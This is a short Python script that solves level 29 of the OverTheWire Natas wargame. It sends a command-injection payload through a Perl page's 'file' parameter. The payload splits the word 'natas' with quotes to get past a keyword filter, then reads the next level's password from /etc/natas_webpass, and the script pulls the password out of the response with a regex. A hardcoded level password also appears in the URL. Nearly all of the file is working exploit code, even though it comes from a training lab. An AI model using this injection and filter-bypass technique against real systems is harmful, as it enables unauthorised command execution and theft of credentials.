import requests
import re
from urllib.parse import quote, unquote

session = requests.Session()

def natas29(url):
    # http://natas29.natas.labs.overthewire.org/index.pl?file=|cat+%22/etc/nat%22%22as_webpass/nat%22%22as30%22|tr+%27\n%27+%27+%27
    payload = "|cat+%22/etc/nat%22%22as_webpass/nat%22%22as30%22|tr+%27\n%27+%27+%27"
    response = session.get(f"{url}index.pl?file={payload}")
    return re.findall(r"([^><{} =:\/\"\n]{32})", response.text)[1]         

if __name__ == '__main__':
    url = 'http://natas29:airooCaiseiyee8he8xongien9euhe8b@natas29.natas.labs.overthewire.org/'
    print(natas29(url))
